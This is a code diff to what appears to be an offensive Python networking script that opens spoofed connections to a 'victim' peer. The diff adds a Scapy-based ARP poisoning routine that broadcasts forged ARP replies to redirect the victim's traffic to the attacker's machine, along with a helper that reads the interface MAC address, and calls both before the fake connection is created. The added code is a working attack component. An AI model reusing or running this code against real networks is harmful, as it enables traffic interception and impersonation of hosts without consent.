@@ -85,6 +85,22 @@ def addr_packet(str_addrs):
 	msg.addrs = addrs
 	return msg
 
+# Make web traffic go towards the fake IP
+def arp_poison(fake_ip, mac_address):
+	try:
+		for _ in range(5):
+			srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=fake_ip, hwsrc=mac_address), verbose=0, timeout=0.05)
+			time.sleep(0.05)
+	except socket.error:
+		# Are you sure you're running as root?
+		print('Error: You need to run this script as root.')
+		sys.exit()
+
+def get_mac_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
+    return ':'.join('%02x' % b for b in info[18:24])
+
 def initialize_fake_connection(src_ip, dst_ip):
 	src_port = attacker_port
 	dst_port = victim_port
@@ -96,6 +112,11 @@ def initialize_fake_connection(src_ip, dst_ip):
 	print('Resulting ifconfig interface:')
 	print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
 
+	print('ARP poisoning victim...')
+	mac_address = get_mac_address(spoof_interface)
+	arp_poison(src_ip, mac_address)
+
+	print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	
 	#if not hasattr(s,'SO_BINDTODEVICE') :
